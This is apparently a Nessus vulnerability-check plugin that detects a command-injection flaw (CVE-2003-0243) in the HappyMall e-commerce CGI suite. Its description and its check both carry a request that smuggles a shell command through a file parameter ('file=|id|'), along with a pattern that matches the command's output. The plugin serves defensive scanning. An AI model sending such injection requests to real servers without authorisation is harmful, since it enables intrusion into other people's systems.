#
# (C) Tenable Network Security, Inc.
#

# Ref: http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0058.html


include("compat.inc");

if(description)
{
 script_id(11602);
 script_bugtraq_id(7529, 7530);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2003-0243");
 script_xref(name:"OSVDB", value:"3566");
 script_xref(name:"OSVDB", value:"3602");
 
 script_name(english:"HappyMall Multiple Script Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running the HappyMall E-Commerce CGI suite." );
 script_set_attribute(attribute:"description", value:
"There is a flaw HappyMall which may allow an attacker to execute
arbitrary commands with the privileges of the HTTP daemon (typically
root or nobody), by making a request like :
	/shop/normal_html.cgi?file=|id|

In addition, member_html.cgi has been reported vulnerable. However,
Nessus has not checked for this." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0058.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the newest version of this CGI" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 script_summary(english:"Checks for HappyMall");
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

http_check_remote_code (
			extra_dirs:make_list("/shop"),
			check_request:"/normal_html.cgi?file=|id|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
